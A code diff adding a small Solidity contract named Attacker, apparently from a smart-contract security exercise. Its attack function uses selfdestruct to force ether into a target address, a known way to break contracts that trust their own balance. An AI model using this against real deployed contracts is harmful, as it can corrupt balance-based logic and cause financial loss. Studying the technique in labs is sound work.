@@ -1,0 +1,11 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract Attacker {
+    receive() external payable {
+
+    }
+    function attack(address target) public {
+        selfdestruct(payable(target));
+    }
+}
